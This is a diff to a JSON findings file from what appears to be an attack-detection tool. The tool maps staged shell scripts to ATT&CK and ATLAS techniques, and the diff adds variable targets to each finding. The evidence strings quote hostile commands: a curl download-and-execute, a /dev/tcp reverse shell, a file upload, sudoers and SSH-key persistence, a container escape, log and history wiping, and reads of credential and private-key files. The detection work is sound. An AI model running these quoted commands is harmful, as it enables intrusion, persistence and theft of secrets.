@@ -956,7 +956,7 @@
     "files": "20261022_091000_step03_privesc.sh",
     "attack": "T1548.003, T1548.001, T1611",
     "atlas": "AML.T0105",
-    "targets": "file /etc/sudoers.d/svc; file /tmp/tool ($F); mount /:/host",
+    "targets": "file /etc/sudoers.d/svc; rule $RULE; file /tmp/tool ($F); mount /:/host",
     "evidence": "SudoersModification: echo \"$RULE\" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)\nSetuidBit: chmod u+s \"$F\" (20261022_091000_step03_privesc.sh:4)\nContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)"
   },
   {
@@ -980,7 +980,7 @@
     "files": "20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl",
     "attack": "T1053.003, T1053.002, T1053.006, T1543.002, T1136.001, T1098.004, T1546.004",
     "atlas": "AML.T0125, AML.T0142",
-    "targets": "unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc",
+    "targets": "runs $JOB; unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc; adds $LINE",
     "evidence": "ScheduledJobCreation: (crontab -l; echo \"$JOB\") | crontab - (20261022_091500_step04_persist.sh:3)\nScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)\nSystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)\nSystemdUnitCreation: systemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)\nAccountCreation: useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)\nAccountCreation: useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)\nSshKeyPersistence: echo \"$KEY\" >> ~/.ssh/authorized_keys (20261022_091500_step04_persist.sh:4)\nShellProfilePersistence: echo \"$LINE\" >> ~/.bashrc (20261022_091500_step04_persist.sh:8)"
   },
   {
@@ -1016,7 +1016,7 @@
     "files": "20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": "T1059.004, T1105, T1095",
     "atlas": "AML.T0072, AML.T0050",
-    "targets": "url http://203.0.113.40/s.sh; host 203.0.113.41 ($H)",
+    "targets": "url http://203.0.113.40/s.sh; host 203.0.113.41 ($H); port $PORT",
     "evidence": "ShellDownloadAndExecute: sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\" (20261022_092500_step06_stage.sh:4)\nReverseShell: os.system(\"exec 3<>/dev/tcp/$H/$PORT\") (20261022_093000_step07_channel.py:8)"
   },
   {
@@ -1064,7 +1064,7 @@
     "files": "20261022_092000_step05_evade.sh",
     "attack": "T1070.003, T1070.006",
     "atlas": "AML.T0138",
-    "targets": null,
+    "targets": "file $F",
     "evidence": "HistoryClearing: history -c (20261022_092000_step05_evade.sh:7)\nTimestomp: touch -r /bin/ls \"$F\" (20261022_092000_step05_evade.sh:8)"
   },
   {
@@ -1124,7 +1124,7 @@
     "files": "20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl",
     "attack": null,
     "atlas": null,
-    "targets": "unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc",
+    "targets": "runs $JOB; unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc; adds $LINE",
     "evidence": "ScheduledJobCreation: (crontab -l; echo \"$JOB\") | crontab - (20261022_091500_step04_persist.sh:3)\nScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)\nSystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)\nSystemdUnitCreation: systemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)\nAccountCreation: useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)\nAccountCreation: useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)\nSshKeyPersistence: echo \"$KEY\" >> ~/.ssh/authorized_keys (20261022_091500_step04_persist.sh:4)\nShellProfilePersistence: echo \"$LINE\" >> ~/.bashrc (20261022_091500_step04_persist.sh:8)"
   },
   {
@@ -1136,7 +1136,7 @@
     "files": "20261022_091000_step03_privesc.sh",
     "attack": null,
     "atlas": null,
-    "targets": "file /etc/sudoers.d/svc; file /tmp/tool ($F); mount /:/host",
+    "targets": "file /etc/sudoers.d/svc; rule $RULE; file /tmp/tool ($F); mount /:/host",
     "evidence": "SudoersModification: echo \"$RULE\" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)\nSetuidBit: chmod u+s \"$F\" (20261022_091000_step03_privesc.sh:4)\nContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)"
   },
   {
@@ -1160,7 +1160,7 @@
     "files": "20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": null,
     "atlas": null,
-    "targets": "url http://203.0.113.40/s.sh; url https://files.example.net/up; file out.tgz; host 203.0.113.41 ($H)",
+    "targets": "url http://203.0.113.40/s.sh; url https://files.example.net/up; file out.tgz; host 203.0.113.41 ($H); port $PORT",
     "evidence": "ShellDownloadAndExecute: sudo bash -c \"$(curl -fsSL http://203.0.113.40/s.sh)\" (20261022_092500_step06_stage.sh:4)\nFileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)\nReverseShell: os.system(\"exec 3<>/dev/tcp/$H/$PORT\") (20261022_093000_step07_channel.py:8)"
   },
   {
@@ -1196,7 +1196,7 @@
     "files": "20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl",
     "attack": null,
     "atlas": null,
-    "targets": "log /var/log/auth.log; setting HISTFILE",
+    "targets": "log /var/log/auth.log; setting HISTFILE; file $F",
     "evidence": "LogDeletion: rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)\nHistoryClearing: history -c (20261022_092000_step05_evade.sh:7)\nHistoryDisabling: unset HISTFILE (20261022_092000_step05_evade.sh:3)\nTimestomp: touch -r /bin/ls \"$F\" (20261022_092000_step05_evade.sh:8)\niptables: iptables -F (20261022_092000_step05_evade.sh:5)\niptables: iptables -F (audit_20261022_093500.jsonl)"
   },
   {
@@ -1232,7 +1232,7 @@
     "files": "20261022_090500_step02_creds.sh, 20261022_091500_step04_persist.sh, 20261022_092000_step05_evade.sh, 20261022_092500_step06_stage.sh, audit_20261022_093500.jsonl",
     "attack": "T1048, T1053.002, T1053.003, T1053.006, T1098.004, T1543.002, T1552.007, T1685, T1685.004, T1686",
     "atlas": null,
-    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; SshKeyPersistence: file ~/.ssh/authorized_keys; SystemdUnitCreation: unit sync.service; SecurityToolDisabling: service auditd",
+    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; ScheduledJobCreation: runs $JOB; SshKeyPersistence: file ~/.ssh/authorized_keys; SystemdUnitCreation: unit sync.service; SecurityToolDisabling: service auditd",
     "evidence": null
   },
   {
@@ -1244,7 +1244,7 @@
     "files": "20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh, 20261022_092000_step05_evade.sh, 20261022_092500_step06_stage.sh, audit_20261022_093500.jsonl",
     "attack": "T1048, T1053.006, T1070.003, T1098.004, T1543.002, T1546.004, T1548.003, T1552.001, T1552.004, T1685, T1685.006, T1686",
     "atlas": null,
-    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; SshKeyPersistence: file ~/.ssh/authorized_keys; SystemdUnitCreation: unit sync.service; ShellProfilePersistence: file ~/.bashrc; SudoersModification: file /etc/sudoers.d/svc; CredentialFileRead: file ~/.aws/credentials; PrivateKeyRead: file ~/.ssh/id_rsa; SecurityToolDisabling: service auditd; LogDeletion: log /var/log/auth.log",
+    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; ScheduledJobCreation: runs $JOB; SshKeyPersistence: file ~/.ssh/authorized_keys; SystemdUnitCreation: unit sync.service; ShellProfilePersistence: file ~/.bashrc, adds $LINE; SudoersModification: file /etc/sudoers.d/svc, rule $RULE; CredentialFileRead: file ~/.aws/credentials; PrivateKeyRead: file ~/.ssh/id_rsa; SecurityToolDisabling: service auditd; LogDeletion: log /var/log/auth.log",
     "evidence": null
   },
   {
@@ -1268,7 +1268,7 @@
     "files": "20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh, audit_20261022_093500.jsonl",
     "attack": "T1003.008, T1053.002, T1053.006, T1136.001, T1543.002, T1548.003, T1552.007, T1611",
     "atlas": null,
-    "targets": "ShadowFileRead: file /etc/shadow; AccountCreation: account svc; SystemdUnitCreation: unit sync.service; SudoersModification: file /etc/sudoers.d/svc; ContainerEscape: mount /:/host",
+    "targets": "ShadowFileRead: file /etc/shadow; ScheduledJobCreation: runs $JOB; AccountCreation: account svc; SystemdUnitCreation: unit sync.service; SudoersModification: file /etc/sudoers.d/svc, rule $RULE; ContainerEscape: mount /:/host",
     "evidence": null
   },
   {
@@ -1292,7 +1292,7 @@
     "files": "20261022_090500_step02_creds.sh, 20261022_091000_step03_privesc.sh, 20261022_091500_step04_persist.sh, 20261022_092000_step05_evade.sh, audit_20261022_093500.jsonl",
     "attack": "T1053.002, T1548.001, T1548.003, T1552.003, T1690",
     "atlas": null,
-    "targets": "SetuidBit: file /tmp/tool ($F); SudoersModification: file /etc/sudoers.d/svc; ShellHistoryRead: file ~/.bash_history; HistoryDisabling: setting HISTFILE",
+    "targets": "ScheduledJobCreation: runs $JOB; SetuidBit: file /tmp/tool ($F); SudoersModification: file /etc/sudoers.d/svc, rule $RULE; ShellHistoryRead: file ~/.bash_history; HistoryDisabling: setting HISTFILE",
     "evidence": null
   },
   {
@@ -1316,7 +1316,7 @@
     "files": "20261022_090500_step02_creds.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": "T1048, T1095, T1552.007",
     "atlas": null,
-    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; ReverseShell: host 203.0.113.41 ($H)",
+    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; ReverseShell: host 203.0.113.41 ($H), port $PORT",
     "evidence": null
   },
   {
@@ -1328,7 +1328,7 @@
     "files": "20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": "T1048, T1095, T1105",
     "atlas": null,
-    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; ReverseShell: host 203.0.113.41 ($H); ShellDownloadAndExecute: url http://203.0.113.40/s.sh",
+    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; ReverseShell: host 203.0.113.41 ($H), port $PORT; ShellDownloadAndExecute: url http://203.0.113.40/s.sh",
     "evidence": null
   },
   {
@@ -1376,7 +1376,7 @@
     "files": "20261022_090000_step01_recon.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": "T1048, T1095, T1105, T1552.005",
     "atlas": null,
-    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; ReverseShell: host 203.0.113.41 ($H); ShellDownloadAndExecute: url http://203.0.113.40/s.sh; CloudMetadataAccess: url http://169.254.169.254/latest/meta-data/",
+    "targets": "FileUpload: url https://files.example.net/up, file out.tgz; ReverseShell: host 203.0.113.41 ($H), port $PORT; ShellDownloadAndExecute: url http://203.0.113.40/s.sh; CloudMetadataAccess: url http://169.254.169.254/latest/meta-data/",
     "evidence": null
   },
   {
@@ -1388,7 +1388,7 @@
     "files": "20261022_091000_step03_privesc.sh, 20261022_092000_step05_evade.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py, audit_20261022_093500.jsonl",
     "attack": "T1059.004, T1611, T1685",
     "atlas": null,
-    "targets": "ShellDownloadAndExecute: url http://203.0.113.40/s.sh; ReverseShell: host 203.0.113.41 ($H); ContainerEscape: mount /:/host; SecurityToolDisabling: service auditd",
+    "targets": "ShellDownloadAndExecute: url http://203.0.113.40/s.sh; ReverseShell: host 203.0.113.41 ($H), port $PORT; ContainerEscape: mount /:/host; SecurityToolDisabling: service auditd",
     "evidence": null
   },
   {
@@ -1436,7 +1436,7 @@
     "files": "20261022_090500_step02_creds.sh, 20261022_091500_step04_persist.sh, 20261022_092000_step05_evade.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py, audit_20261022_093500.jsonl",
     "attack": "T1053.002, T1053.003, T1095, T1552.001, T1552.004, T1560.001, T1685, T1685.004, T1686",
     "atlas": null,
-    "targets": "ReverseShell: host 203.0.113.41 ($H); CredentialFileRead: file ~/.aws/credentials; PrivateKeyRead: file ~/.ssh/id_rsa; ArchiveCreation: archive out.tgz; SecurityToolDisabling: service auditd",
+    "targets": "ScheduledJobCreation: runs $JOB; ReverseShell: host 203.0.113.41 ($H), port $PORT; CredentialFileRead: file ~/.aws/credentials; PrivateKeyRead: file ~/.ssh/id_rsa; ArchiveCreation: archive out.tgz; SecurityToolDisabling: service auditd",
     "evidence": null
   },
   {
@@ -1508,7 +1508,7 @@
     "files": "20261022_090500_step02_creds.sh, 20261022_091500_step04_persist.sh, 20261022_092500_step06_stage.sh, 20261022_093000_step07_channel.py",
     "attack": null,
     "atlas": "AML.T0050, AML.T0090, AML.T0142",
-    "targets": "ShellDownloadAndExecute: url http://203.0.113.40/s.sh; ReverseShell: host 203.0.113.41 ($H); ShadowFileRead: file /etc/shadow; ShellProfilePersistence: file ~/.bashrc",
+    "targets": "ShellDownloadAndExecute: url http://203.0.113.40/s.sh; ReverseShell: host 203.0.113.41 ($H), port $PORT; ShadowFileRead: file /etc/shadow; ShellProfilePersistence: file ~/.bashrc, adds $LINE",
     "evidence": null
   },
   {
@@ -1520,7 +1520,7 @@
     "files": "20261022_091500_step04_persist.sh",
     "attack": null,
     "atlas": "AML.T0142",
-    "targets": "ShellProfilePersistence: file ~/.bashrc",
+    "targets": "ShellProfilePersistence: file ~/.bashrc, adds $LINE",
     "evidence": null
   },
   {
